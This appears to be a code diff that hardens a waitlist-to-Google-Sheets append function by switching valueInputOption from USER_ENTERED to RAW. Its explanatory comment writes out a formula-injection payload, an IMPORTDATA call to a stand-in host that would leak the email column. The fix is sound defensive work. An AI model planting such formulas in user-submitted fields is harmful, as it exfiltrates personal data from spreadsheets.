@@ -146,8 +146,15 @@ export async function appendWaitlistRow(row: WaitlistRow): Promise<SheetOutcome>
     }
 
     const range = `${encodeURIComponent(TAB)}!A:F`;
+    // RAW, not USER_ENTERED. USER_ENTERED makes Sheets parse each cell as though
+    // it had been typed, so a name of =IMPORTDATA("https://example.test/?x="&C2)
+    // becomes a live formula: IMPORTDATA and IMPORTXML fetch their URL as soon as
+    // the tracker is opened, with no prompt, which would send the whole email
+    // column to whoever owns that host. RAW stores every value as literal text.
+    // The timestamp is written pre-formatted and sorts lexicographically, so it
+    // loses nothing by arriving as text rather than as a parsed date.
     const res = await fetch(
-      `${API}/${SHEET_ID}/values/${range}:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`,
+      `${API}/${SHEET_ID}/values/${range}:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS`,
       {
         method: "POST",
         headers: {
